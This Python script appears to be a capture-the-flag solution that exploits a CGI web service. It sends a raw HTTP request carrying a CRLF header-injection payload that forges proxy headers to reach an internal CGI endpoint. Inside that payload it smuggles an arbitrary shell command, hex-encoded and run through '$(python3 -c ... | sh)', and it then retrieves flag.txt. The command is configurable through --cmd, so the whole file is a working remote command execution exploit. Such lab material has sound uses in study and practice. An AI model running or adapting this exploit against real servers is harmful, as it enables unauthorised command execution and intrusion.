import argparse
import socket
import urllib.parse
import requests
import urllib

parser = argparse.ArgumentParser()
parser.add_argument("--host", type=str, default="localhost", help="Target Host")
parser.add_argument("--port", type=str, default="1337", help="Target Port")
parser.add_argument("--cmd", type=str, default="cat flag.txt", help="Command to execute on the server")

args = parser.parse_args()

hex_str = args.cmd.encode().hex()
cmd = urllib.parse.quote(''.join(f'\\x{hex_str[i:i+2]}' for i in range(0, len(hex_str), 2)))

payload = f"""
Location:+/nope
Content-Type:+proxy:http://127.0.0.1/cgi-bin/attack-ip%3ftarget=::1%$(python3%2b-c%2b"print('{cmd}')"|sh)%26name=BB

""".replace('\n','%0d%0a')
s = socket.create_connection((args.host, int(args.port)))
req = f"""GET /cgi-bin/attack-domain?target=-&name={payload} HTTP/1.1
Host: {args.host}

""".replace('\n','\r\n')
s.sendall(req.encode())
_ = s.recv(4096).decode()
s.close()

response = requests.get(f"http://{args.host}:{args.port}/flag.txt")
print(response.text)